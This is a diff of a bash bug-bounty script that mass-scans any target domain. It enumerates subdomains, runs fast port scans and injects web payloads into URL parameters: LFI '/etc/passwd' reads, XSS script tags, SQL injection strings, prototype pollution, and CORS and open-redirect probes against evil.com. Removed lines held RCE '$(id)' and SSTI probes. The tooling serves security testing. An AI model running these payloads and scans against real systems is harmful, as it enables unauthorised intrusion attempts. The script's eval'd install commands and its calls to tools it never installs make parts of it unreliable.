@@ -9,142 +9,236 @@ echo "
 /_____/   U
 "
 
-# Function to handle errors and retry
-fetch_with_retries() {
-    local url=$1
-    local output_file=$2
-    local retries=5
-    local delay=5
+# Function to check if a tool is installed, and install it if not
+check_and_install() {
+    local tool=$1
+    local install_command=$2
 
-    for ((i=0; i<$retries; i++)); do
-        curl -s "$url" -o "$output_file"
-        if [[ $? -eq 0 && -s "$output_file" ]]; then
-            echo "[*] Successfully fetched $url"
-            return 0
+    if ! command -v "$tool" &> /dev/null; then
+        echo "[*] $tool not found. Installing..."
+        eval "$install_command"
+        if ! command -v "$tool" &> /dev/null; then
+            echo "[!] Failed to install $tool. Exiting."
+            exit 1
+        fi
+    else
+        echo "[*] $tool is already installed."
+    fi
+}
+
+# Install required tools if not already installed
+check_and_install "curl" "sudo apt-get install -y curl"
+check_and_install "grep" "sudo apt-get install -y grep"
+check_and_install "awk" "sudo apt-get install -y gawk"
+check_and_install "sed" "sudo apt-get install -y sed"
+check_and_install "sort" "sudo apt-get install -y coreutils"
+check_and_install "amass" "GO111MODULE=on go install -v github.com/OWASP/Amass/v3/...@latest"
+check_and_install "assetfinder" "GO111MODULE=on go install -v github.com/tomnomnom/assetfinder@latest"
+check_and_install "subfinder" "GO111MODULE=on go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
+check_and_install "httpx" "GO111MODULE=on go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest"
+check_and_install "waybackurls" "GO111MODULE=on go install -v github.com/tomnomnom/waybackurls@latest"
+check_and_install "gau" "GO111MODULE=on go install -v github.com/lc/gau@latest"
+check_and_install "paramspider" "GO111MODULE=on go install -v github.com/devanshbatham/ParamSpider@latest"
+check_and_install "gf" "GO111MODULE=on go install -v github.com/tomnomnom/gf@latest"
+check_and_install "qsreplace" "GO111MODULE=on go install -v github.com/tomnomnom/qsreplace@latest"
+check_and_install "dalfox" "GO111MODULE=on go install -v github.com/hahwul/dalfox@latest"
+check_and_install "shuffledns" "GO111MODULE=on go install -v github.com/projectdiscovery/shuffledns/cmd/shuffledns@latest"
+check_and_install "dnsx" "GO111MODULE=on go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest"
+check_and_install "naabu" "GO111MODULE=on go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest"
+check_and_install "katana" "GO111MODULE=on go install -v github.com/projectdiscovery/katana/cmd/katana@latest"
+check_and_install "nuclei" "GO111MODULE=on go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest"
+check_and_install "dirsearch" "git clone https://github.com/maurosoria/dirsearch.git && cd dirsearch && python3 setup.py install"
+
+# Function to check Local File Inclusion (LFI) vulnerability
+check_lfi() {
+    local target=$1
+
+    echo "[*] Checking for LFI vulnerabilities on $target..."
+
+    gau $target | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
+
+    echo "[*] LFI check completed for $target"
+}
+
+# Function to check for Open Redirect vulnerabilities
+check_open_redirect() {
+    local target=$1
+    local lhost=$2
+
+    echo "[*] Checking for Open Redirect vulnerabilities on $target..."
+
+    gau $target | gf redirect | qsreplace "$lhost" | xargs -I% -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $lhost" && echo "VULN! %"'
+
+    echo "[*] Open Redirect check completed for $target"
+}
+
+# Function to check for vulnerabilities using gospider, qsreplace, and dalfox
+check_with_gospider() {
+    local urls_file=$1
+    local output_file=$2
+
+    echo "[*] Running gospider and dalfox for vulnerability detection..."
+
+    gospider -S "$urls_file" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}' | grep "=" | qsreplace -a | dalfox pipe | tee "$output_file"
+
+    echo "[*] gospider and dalfox check completed. Results saved in $output_file"
+}
+
+# Function to check for subdomain enumeration, HTTP response, and prototype pollution
+check_subdomains_and_proto_pollution() {
+    local target=$1
+    local output_file=$2
+
+    echo "[*] Checking subdomains and prototype pollution on $target..."
+
+    subfinder -d "$target" -all -silent | httpx -silent -threads 300 | anew -q "$output_file"
+    sed 's/$/\/?__proto__[testparam]=exploit\//' "$output_file" | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"
+
+    echo "[*] Subdomain and prototype pollution check completed. Results saved in $output_file"
+}
+
+# Function to check for JavaScript variables and construct potential XSS payloads
+check_js_vars_for_xss() {
+    local target=$1
+
+    echo "[*] Checking for JavaScript variables and potential XSS payloads on $target..."
+
+    assetfinder --subs-only "$target" | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do
+        vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9_]+" | sed -e 's, var, '"$url"'?,g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g')
+        echo -e "\e[1;33m$url\n" "\e[1;32m$vars"
+    done
+
+    echo "[*] JavaScript variable check for potential XSS completed on $target"
+}
+
+# Function to check for CORS vulnerability
+check_cors() {
+    local target=$1
+
+    echo "[*] Checking for CORS vulnerabilities on $target..."
+
+    gau "$target" | while read url; do
+        target=$(curl -sIH "Origin: https://evil.com" -X GET "$url")
+        if echo "$target" | grep -q 'https://evil.com'; then
+            echo "[Potential CORS Found] $url"
         else
-            echo "[!] Error fetching $url. Retrying in $delay seconds..."
-            sleep $delay
+            echo "Nothing on $url"
         fi
     done
-    echo "[!] Failed to fetch $url after $retries attempts."
-    return 1
+
+    echo "[*] CORS check completed for $target"
+}
+
+# Function to check for XSS vulnerabilities using waybackurls
+check_xss_with_waybackurls() {
+    local target=$1
+
+    echo "[*] Checking for XSS vulnerabilities on $target using waybackurls..."
+
+    waybackurls $target | grep '=' | qsreplace '"><script>alert(1)</script>' | while read host; do
+        curl -sk --path-as-is "$host" | grep -qs "<script>alert(1)</script>" && echo "$host is vulnerable"
+    done
+
+    echo "[*] XSS check with waybackurls completed for $target"
+}
+
+# Function to perform subdomain enumeration, DNS resolution, port scanning, and vulnerability scanning
+perform_full_scan() {
+    local target=$1
+
+    echo "[*] Performing full scan on $target..."
+
+    # Subdomain enumeration
+    subfinder -d "$target" -all | anew subs.txt
+    shuffledns -d "$target" -r resolvers.txt -w n0kovo_subdomains_huge.txt | anew subs.txt
+
+    # DNS resolution
+    dnsx -l subs.txt -r resolvers.txt | anew resolved.txt
+
+    # Port scanning
+    naabu -l resolved.txt -nmap -rate 5000 | anew ports.txt
+
+    # HTTP probing
+    httpx -l ports.txt | anew alive.txt
+
+    # Vulnerability scanning with katana
+    katana -list alive.txt -silent -nc -jc -kf all -fx -xhr -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -aff | anew urls.txt
+
+    # Nuclei for vulnerability scanning
+    nuclei -l urls.txt -es info,unknown -ept ssl -ss template-spray | anew nuclei.txt
+
+    echo "[*] Full scan completed. Results saved in subs.txt, resolved.txt, ports.txt, alive.txt, urls.txt, nuclei.txt"
+}
+
+# Function to perform directory and file enumeration with dirsearch
+perform_dirsearch() {
+    local urls_file=$1
+    local output_file=$2
+
+    echo "[*] Running dirsearch for directory and file enumeration..."
+
+    dirsearch -l "$urls_file" -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json --deep-recursive --force-recursive --exclude-sizes=0B --random-agent --full-url -o "$output_file"
+
+    echo "[*] Directory and file enumeration completed. Results saved in $output_file"
+}
+
+# Function to check for potential SQL injection vulnerabilities
+check_sql_injection() {
+    local file=$1
+
+    echo "[*] Checking for potential SQL injection vulnerabilities..."
+
+    grep "=" "$file" | qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \
+    printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n"
+
+    echo "[*] SQL injection check completed"
 }
 
 # Define target
 TARGET=$1
+LHOST=${LHOST:-"http://example.com"}
 
 if [ -z "$TARGET" ]; then
     echo "Usage: $0 <target>"
     exit 1
 fi
 
-# Create a directory for the target
-mkdir -p $TARGET
-cd $TARGET
+# Create URLs file for gospider
+URLS_FILE="urls_$TARGET.txt"
+SUBDOMAINS_FILE="subdomains_$TARGET.txt"
+gau $TARGET > "$URLS_FILE"
 
-# Subdomain enumeration
-echo "[*] Enumerating subdomains for $TARGET..."
-subfinder -d $TARGET -silent -o subfinder_subdomains.txt &
-assetfinder --subs-only $TARGET > assetfinder_subdomains.txt &
-amass enum -d $TARGET -o amass_subdomains.txt &
-wait
+# Start LFI check
+check_lfi $TARGET
 
-# Merging subdomains into a single file and removing duplicates
-echo "[*] Merging subdomains and removing duplicates..."
-cat subfinder_subdomains.txt assetfinder_subdomains.txt amass_subdomains.txt | sort -u > all_subdomains.txt
+# Start Open Redirect check
+check_open_redirect $TARGET $LHOST
 
-# Resolving live subdomains using httpx
-echo "[*] Resolving live subdomains with httpx..."
-httpx -silent -l all_subdomains.txt -title -status-code -content-length -web-server -o live_subdomains.txt
+# Start gospider and dalfox check
+check_with_gospider "$URLS_FILE" "gospider_dalfox_$TARGET.txt"
 
-# Collecting endpoints with waybackurls and gau
-echo "[*] Collecting endpoints with waybackurls and gau..."
-fetch_with_retries "https://web.archive.org/cdx/search/cdx?url=$TARGET/*&output=txt&collapse=urlkey&fl=original&page=/" "waybackurls_endpoints.txt"
-cat live_subdomains.txt | gau >> waybackurls_endpoints.txt &
-wait
-sort -u waybackurls_endpoints.txt -o all_endpoints.txt
+# Start subdomain and prototype pollution check
+check_subdomains_and_proto_pollution $TARGET "$SUBDOMAINS_FILE"
 
-# Running paramspider for parameters enumeration
-echo "[*] Running paramspider for parameters enumeration..."
-paramspider -l $live_subdomains.txt -o param.txt
+# Start JavaScript variable check for potential XSS
+check_js_vars_for_xss $TARGET
 
-# Checking vulnerabilities using gf patterns
-echo "[*] Checking for vulnerabilities..."
+# Start CORS check
+check_cors $TARGET
 
-# GF patterns
-cat all_endpoints.txt | gf xss > xss.txt &
-cat all_endpoints.txt | gf sqli > sqli.txt &
-cat all_endpoints.txt | gf lfi > lfi.txt &
-cat all_endpoints.txt | gf redirect > redirect.txt &
-cat all_endpoints.txt | gf rce > rce.txt &
-cat all_endpoints.txt | gf ssti > ssti.txt &
-wait
+# Start XSS check with waybackurls
+check_xss_with_waybackurls $TARGET
 
-# Replace payloads using qsreplace
-echo "[*] Replacing payloads with qsreplace..."
+# Perform full scan
+perform_full_scan $TARGET
 
-# Replace XSS payloads
-qsreplace '"/><script>confirm(1)</script>' < xss.txt > xss_payloads.txt
+# Perform directory and file enumeration
+perform_dirsearch "$URLS_FILE" "dirsearch_$TARGET.txt"
 
-# Replace SQLi payloads
-qsreplace 'payloads' < sqli.txt > sqli_payloads.txt
+# Check for SQL injection vulnerabilities
+check_sql_injection "$URLS_FILE"
 
-# Replace LFI payloads
-qsreplace '../../../../../etc/passwd' < lfi.txt > lfi_payloads.txt
+# Clean up URLs file
+rm "$URLS_FILE"
 
-# Replace Redirect payloads
-qsreplace 'http://evil.com' < redirect.txt > redirect_payloads.txt
-
-# Replace RCE payloads
-qsreplace '$(id)' < rce.txt > rce_payloads.txt
-
-# Replace SSTI payloads
-qsreplace '{{7*7}}' < ssti.txt > ssti_payloads.txt
-
-# XSS Check with paramspider
-echo "[*] Checking for XSS vulnerabilities using paramspider results..."
-paramspider -l $all_endpoints.txt | qsreplace '"/><script>confirm(1)</script>' > xss.txt
-while read -r host; do
-    if curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)"; then
-        echo -e "$host \033[0;31mVulnerable\033[0m"
-    else
-        echo -e "$host \033[0;32mNot Vulnerable\033[0m"
-    fi
-done < xss.txt
-
-# Keyword search
-echo "[*] Searching for keywords in all_endpoints.txt..."
-KEYWORDS=("admin" "config" "key" "password" "token" "login" "secure" "api" "db" "backup" "private" "public" "internal" "test" "staging" "root" "access" "user" "credentials" "secret" "verify" "auth" "cmd" "execute" "upload" "download" "file" "debug" "test" "error" "database" "php" "asp" "jsp" "cgi" "shell" "bin" "home" "account" "panel" "portal" "control" "manage" "admin" "system" "webadmin" "administrator" "host" "site" "server" "netadmin" "domain" "dns" "config" "secure" "security" "backup" "data" "account" "file" "upload" "download" "db" "access" "edit" "modify" "remove" "delete" "update" "insert" "select" "drop" "create" "alter" "grant" "revoke" "admin" "administrator" "manager" "root" "superuser" "system" "owner" "operator" "tech" "developer" "maintainer" "tester" "user" "guest" "anonymous" "employee" "staff" "hr" "finance" "it" "support" "helpdesk" "network" "api" "auth" "token" "jwt" "oauth" "sso" "openid" "saml" "cas" "2fa" "mfa" "otp" "ldap" "kerberos" "key" "secret" "private" "public" "ssh" "rsa" "dsa" "ecdsa" "pki" "certificate" "ssl" "tls" "https" "http" "admin" "administrator" "admin")
-
-for keyword in "${KEYWORDS[@]}"; do
-    grep -i "$keyword" all_endpoints.txt > "${keyword}_endpoints.txt"
-    if [ -s "${keyword}_endpoints.txt" ]; then
-        echo -e "\033[0;31mVulnerability found: $keyword\033[0m"
-    else
-        echo -e "\033[0;32mNo issues found for: $keyword\033[0m"
-    fi
-done
-
-# Output summary
-echo "[*] Summary:"
-echo "Total subdomains found by subfinder: $(wc -l < subfinder_subdomains.txt)"
-echo "Total subdomains found by assetfinder: $(wc -l < assetfinder_subdomains.txt)"
-echo "Total subdomains found by amass: $(wc -l < amass_subdomains.txt)"
-echo "Total unique subdomains: $(wc -l < all_subdomains.txt)"
-echo "Total live subdomains: $(wc -l < live_subdomains.txt)"
-echo "Total endpoints collected: $(wc -l < all_endpoints.txt)"
-echo "Paramspider parameters: $(wc -l < param.txt)"
-echo "GF XSS results: $(wc -l < xss.txt)"
-echo "GF SQLi results: $(wc -l < sqli.txt)"
-echo "GF LFI results: $(wc -l < lfi.txt)"
-echo "GF Redirect results: $(wc -l < redirect.txt)"
-echo "GF RCE results: $(wc -l < rce.txt)"
-echo "GF SSTI results: $(wc -l < ssti.txt)"
-echo "XSS check results: $(wc -l < xss_payloads.txt)"
-echo "SQLi check results: $(wc -l < sqli_payloads.txt)"
-echo "LFI check results: $(wc -l < lfi_payloads.txt)"
-echo "Redirect check results: $(wc -l < redirect_payloads.txt)"
-echo "RCE check results: $(wc -l < rce_payloads.txt)"
-echo "SSTI check results: $(wc -l < ssti_payloads.txt)"
-
-echo "[*] Done! The results are saved in $(pwd)"
+echo "[[GREAT POWER COMES, GREAT RESPONSIBILITY.......!!  {'YASH LONEWOLF'}]]
